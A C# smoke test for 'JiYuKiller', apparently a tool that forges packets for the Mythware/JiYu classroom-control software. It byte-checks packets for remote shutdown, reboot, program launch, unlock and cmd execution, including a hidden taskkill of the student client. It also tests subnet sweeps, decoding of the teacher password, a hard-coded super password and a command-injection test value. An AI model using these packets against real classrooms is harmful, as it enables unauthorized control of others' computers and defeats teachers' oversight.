using System;
using System.Linq;
using System.Net;
using System.Text;
using JiYuKiller.Core;

// 报文构造冒烟测试（不发包，只验证字节）
static class PacketTest
{
    static int Main()
    {
        var ip = System.Net.IPAddress.Parse("10.132.5.66");
        int fail = 0;

        void Check(string name, bool ok)
        {
            Console.WriteLine((ok ? "PASS " : "FAIL ") + name);
            if (!ok) fail++;
        }

        // DMOC: 关机
        var p = JyPackets.BuildBasic(JyPackets.BasicOp.Shutdown, ip);
        Check("DmocShutdown len=582", p.Length == 582);
        Check("DmocShutdown magic", Encoding.ASCII.GetString(p, 0, 4) == "DMOC");
        Check("DmocShutdown ip@32", p[32] == 10 && p[33] == 132 && p[34] == 5 && p[35] == 66);
        Check("DmocShutdown op=0x10000014", BitConverter.ToUInt32(p, 52) == 0x10000014u);
        Check("DmocShutdown text", Encoding.Unicode.GetString(p, 68, 22) == "教师将关闭您的计算机。");
        var tpl = JyPackets.DmocShutdown;
        bool onlyIpPatched = tpl.Where((b, i) => (i < 32 || i > 35) && p[i] != b).Count() == 0;
        Check("DmocShutdown 其余字节与模板一致", onlyIpPatched);

        // 提示重启
        var p2 = JyPackets.BuildBasic(JyPackets.BasicOp.RebootWithNotice, ip);
        Check("DmocTeacherReboot op=0x10000013", BitConverter.ToUInt32(p2, 52) == 0x10000013u);

        // 强制重启
        var p3 = JyPackets.BuildBasic(JyPackets.BasicOp.ForceReboot, ip);
        Check("DmocForceReboot op=19", BitConverter.ToUInt32(p3, 52) == 19);

        // 关闭所有应用
        var p4 = JyPackets.BuildBasic(JyPackets.BasicOp.CloseAllApps, ip);
        Check("DmocCloseApps op=2", BitConverter.ToUInt32(p4, 52) == 2);

        // 记事本
        var p5 = JyPackets.BuildBasic(JyPackets.BasicOp.OpenNotepad, ip);
        Check("NotepadLaunch len=893", p5.Length == 893);
        Check("NotepadLaunch ip@19", p5[19] == 10 && p5[20] == 132 && p5[21] == 5 && p5[22] == 66);
        Check("NotepadLaunch path", Encoding.Unicode.GetString(p5, 47, 62).Contains("NOTEPAD.EXE"));

        // 远程命令 (/c)
        var c1 = JyPackets.BuildCommand(ip, "taskkill /f /im studentmain.exe", true);
        Check("CmdC len=565+cmd*2", c1.Length == 565 + 31 * 2);
        Check("CmdC ip@19", c1[19] == 10 && c1[20] == 132 && c1[21] == 5 && c1[22] == 66);
        string tail = Encoding.Unicode.GetString(c1, 559, c1.Length - 559);
        Check("CmdC tail=/c <cmd>", tail == "/c taskkill /f /im studentmain.exe");

        // 远程命令 (/k)
        var c2 = JyPackets.BuildCommand(ip, "dir", false);
        string tail2 = Encoding.Unicode.GetString(c2, 559, c2.Length - 559);
        Check("CmdK tail=/k dir", tail2 == "/k dir");
        Check("CmdK ip@19", c2[19] == 10);

        // 消息
        var m = JyPackets.BuildMessage(ip, "Hello 你好", 4605);
        Check("Msg header4605", Encoding.ASCII.GetString(m, 0, 4) == "DMOC" && m[8] == 0x6e && m[9] == 0x03);
        Check("Msg ip@12", m[12] == 10 && m[13] == 132 && m[14] == 5 && m[15] == 66);
        string body = Encoding.Unicode.GetString(m, 16, m.Length - 16 - 29);
        Check("Msg text", body == "Hello 你好");
        var m2 = JyPackets.BuildMessage(ip, "x", 4705);
        Check("Msg header4705", m2[8] == 0x9e && m2[9] == 0x03);

        // 程序启动（换路径, 走已验证的程序启动模板）
        // 用模板自身的 IP 构造, 应逐字节还原出模板本身
        var tplIp = System.Net.IPAddress.Parse("192.168.3.254");
        var lp = JyPackets.BuildLaunch(tplIp, @"C:\Windows\system32\NOTEPAD.EXE");
        Check("Launch 原路径还原模板(893B)", lp.Length == 893 && lp.SequenceEqual(JyPackets.NotepadLaunch));
        var lc = JyPackets.BuildLaunch(ip, @"C:\Windows\system32\calc.exe");
        Check("Launch calc 头部同族", lc[0] == JyPackets.NotepadLaunch[0] && lc[1] == JyPackets.NotepadLaunch[1]);
        Check("Launch calc ip@19", lc[19] == 10 && lc[20] == 132 && lc[21] == 5 && lc[22] == 66);
        Check("Launch calc 路径@47", Encoding.Unicode.GetString(lc, 47, 56) == @"C:\Windows\system32\calc.exe");
        Check("Launch calc datalen@23/@27", BitConverter.ToInt32(lc, 23) == lc.Length - 28
              && BitConverter.ToInt32(lc, 27) == lc.Length - 28);
        Check("Launch 长度随路径变化", lc.Length == 893 - 62 + 56);
        Check("Launch 尾部 0x01 保留", lc[lc.Length - 10] == 0x01);
        Check("Launch 预设数量一致", JyPackets.LaunchPresets.Length == JyPackets.LaunchPresetNames.Length);

        // 解锁包
        var u = JyPackets.BuildUnlock(ip);
        Check("Unlock len=43", u.Length == 43);
        Check("Unlock ip@19", u[19] == 10 && u[20] == 132 && u[21] == 5 && u[22] == 66);
        Check("Unlock op=5@39", u[39] == 5);

        // 隐藏指令（/h 语义, 关闭所有极域连接用）
        var h1 = JyPackets.BuildHiddenCommand(ip, "taskkill /f /im studentmain.exe", 4605);
        Check("HiddenCmd len=906(datalen878+28)", h1.Length == 906);
        Check("HiddenCmd magic DMOC", Encoding.ASCII.GetString(h1, 0, 4) == "DMOC");
        Check("HiddenCmd datalen@8=878", BitConverter.ToInt32(h1, 8) == 878);
        Check("HiddenCmd ip@12", h1[12] == 10 && h1[13] == 132 && h1[14] == 5 && h1[15] == 66);
        Check("HiddenCmd cmd@16", Encoding.Unicode.GetString(h1, 16, 62) == "taskkill /f /im studentmain.exe");
        Check("HiddenCmd 其余补零", h1[78] == 0 && h1[900] == 0);
        var h2 = JyPackets.BuildHiddenCommand(ip, "/h taskkill /f /im studentmain.exe", 4705);
        Check("HiddenCmd4705 datalen@8=926", BitConverter.ToInt32(h2, 8) == 926);
        Check("HiddenCmd /h 前缀被剥离", Encoding.Unicode.GetString(h2, 16, 4) == "ta");
        var h3 = JyPackets.BuildHiddenCommand(ip, "dir", 4605);
        Check("HiddenCmd 不同可见包(CmdC)", !h3.SequenceEqual(JyPackets.BuildCommand(ip, "dir", false)));

        // IP 生成器
        var hosts = IpGenerator.GenerateHosts("10.132.5.0/24");
        Check("IPGen /24 count=254", hosts.Count == 254);
        Check("IPGen first=10.132.5.1", hosts[0] == "10.132.5.1");
        Check("IPGen last=10.132.5.254", hosts[hosts.Count - 1] == "10.132.5.254");
        var h31 = IpGenerator.GenerateHosts("10.0.0.4/31");
        Check("IPGen /31 count=2", h31.Count == 2);

        // 审计修复回归: 网段过大必须拒绝（否则千万级展开冻结 UI/内存耗尽）
        bool threwBig = false;
        try { IpGenerator.GenerateHosts("10.0.0.0/8"); }
        catch (FormatException) { threwBig = true; }
        Check("IPGen /8 被拒绝", threwBig);
        threwBig = false;
        try { IpGenerator.GenerateHosts("10.0.0.0/15"); }
        catch (FormatException) { threwBig = true; }
        Check("IPGen /15 被拒绝", threwBig);
        var h16 = IpGenerator.GenerateHosts("172.16.0.0/16");
        Check("IPGen /16 仍可用(65534)", h16.Count == 65534);

        // 审计修复回归: 严格 IPv4 解析（TryParse 会把 "10.132.5" 静默解析成 10.132.0.5）
        IPAddress parsed;
        Check("严格解析 4 段通过", JySender.TryParseIpv4("10.132.5.66", out parsed)
              && parsed.ToString() == "10.132.5.66");
        Check("严格解析 3 段拒绝", !JySender.TryParseIpv4("10.132.5", out parsed));
        Check("严格解析 5 段拒绝", !JySender.TryParseIpv4("1.2.3.4.5", out parsed));
        Check("严格解析 超界拒绝", !JySender.TryParseIpv4("300.1.1.1", out parsed));
        Check("严格解析 空段拒绝", !JySender.TryParseIpv4("10..5.6", out parsed));
        Check("严格解析 空串拒绝", !JySender.TryParseIpv4("", out parsed));
        Check("严格解析 null 拒绝", !JySender.TryParseIpv4(null, out parsed));

        // 审计修复回归: 打开文件/网页的参数净化（防 cmd 注入）
        Check("净化 引号翻倍", JyPackets.SanitizeStartArgument("a\"b") == "a\"\"b");
        Check("净化 去首尾空白", JyPackets.SanitizeStartArgument("  x  ") == "x");
        Check("净化 保留 & | ^ <>", JyPackets.SanitizeStartArgument("a&b|c") == "a&b|c");
        bool threwSan = false;
        try { JyPackets.SanitizeStartArgument("100%t"); }
        catch (FormatException) { threwSan = true; }
        Check("净化 拒绝 %", threwSan);
        threwSan = false;
        try { JyPackets.SanitizeStartArgument("a\nb"); }
        catch (FormatException) { threwSan = true; }
        Check("净化 拒绝控制字符", threwSan);
        var so = JyPackets.BuildStartOpen(ip, "https://x.com/?a=1&b=2");
        string soTail = Encoding.Unicode.GetString(so, 559, so.Length - 559);
        Check("StartOpen 整体引号包裹", soTail == "/c start \"\" \"https://x.com/?a=1&b=2\"");
        Check("StartOpen ip@19", so[19] == 10 && so[20] == 132 && so[21] == 5 && so[22] == 66);
        threwSan = false;
        try { JyPackets.BuildStartOpen(ip, "x\" & calc"); }
        catch (FormatException) { threwSan = true; }
        Check("StartOpen 含%拒绝(带&不再拒绝)", !threwSan);
        var so2 = JyPackets.BuildStartOpen(ip, "a\"b");
        string so2Tail = Encoding.Unicode.GetString(so2, 559, so2.Length - 559);
        Check("StartOpen 引号翻倍落地", so2Tail == "/c start \"\" \"a\"\"b\"");

        // 翘课3.0 移植: 4705 解锁包 + op=6 指令包
        var u47 = JyPackets.BuildUnlockForPort(ip, 4705);
        Check("Unlock4705 len=56", u47.Length == 56);
        Check("Unlock4705 DMOC 头", Encoding.ASCII.GetString(u47, 0, 4) == "DMOC"
              && BitConverter.ToInt32(u47, 8) == 926);
        Check("Unlock4705 ip@32", u47[32] == 10 && u47[33] == 132 && u47[34] == 5 && u47[35] == 66);
        Check("Unlock4705 op=5@52", BitConverter.ToInt32(u47, 52) == 5);
        Check("Unlock4705 会话 dc 前缀", u47[12] == 0xdc && u47[13] == 0x79 && u47[14] == 0xfa && u47[15] == 0xbb);
        var u46 = JyPackets.BuildUnlockForPort(ip, 4605);
        Check("Unlock4605 仍为原 43B", u46.Length == 43 && u46[39] == 5);
        var o6 = JyPackets.BuildOp6(ip);
        Check("Op6 len=177", o6.Length == 177);
        Check("Op6 datalen=149", BitConverter.ToInt32(o6, 8) == 149);
        Check("Op6 ip@32", o6[32] == 10 && o6[33] == 132 && o6[34] == 5 && o6[35] == 66);
        Check("Op6 op=6@52", BitConverter.ToInt32(o6, 52) == 6);
        Check("Op6 其余字节不动", o6[36] == 0x88 && o6[56] == 0x7b && o6[162] == 0x01);
        // IP 借位检查: 模板 IP 192.168.3.254 -> 10.132.5.66, 每个字节独立替换
        Check("Op6 无越界写入", o6[28] == 0x20 && o6[29] == 0x4e);

        // 版本端口
        JyVersion.SetSelected(0);
        Check("2010 port=4605", JyVersion.Port == 4605);
        JyVersion.SetSelected(3);
        Check("2021 port=4705", JyVersion.Port == 4705);

        // mythwarehelper 移植: knock1 密码解码
        // 构造已知明文的编码: "P@ssw0rd" UTF-16LE + XOR(0x15,0x0F,0x0F,0x15 循环) + 双零终止
        Func<string, byte[]> encodeKnock = plain =>
        {
            byte[] utf16 = Encoding.Unicode.GetBytes(plain);
            byte[] outb = new byte[utf16.Length + 2];
            Buffer.BlockCopy(utf16, 0, outb, 0, utf16.Length);   // 末尾双零即数组剩余
            byte[] key = { 0x50 ^ 0x45, 0x43 ^ 0x4c, 0x4c ^ 0x43, 0x45 ^ 0x50 };
            for (int i = 0; i + 3 < outb.Length; i += 4)
            {
                outb[i] ^= key[0]; outb[i + 1] ^= key[1];
                outb[i + 2] ^= key[2]; outb[i + 3] ^= key[3];
            }
            return outb;
        };
        string decoded = JyPassword.DecodeKnock(encodeKnock("P@ssw0rd"));
        Check("knock1 解码 ASCII 密码", decoded == "P@ssw0rd");
        string decoded2 = JyPassword.DecodeKnock(encodeKnock("教室密码123"));
        Check("knock1 解码 中文密码", decoded2 == "教室密码123");
        Check("knock1 空数据返回 null", JyPassword.DecodeKnock(new byte[0]) == null);
        Check("万能密码常量", JyPassword.SuperPassword == "mythware_super_password");

        Console.WriteLine(fail == 0 ? "\nALL TESTS PASSED" : "\n" + fail + " TESTS FAILED");
        return fail == 0 ? 0 : 1;
    }
}
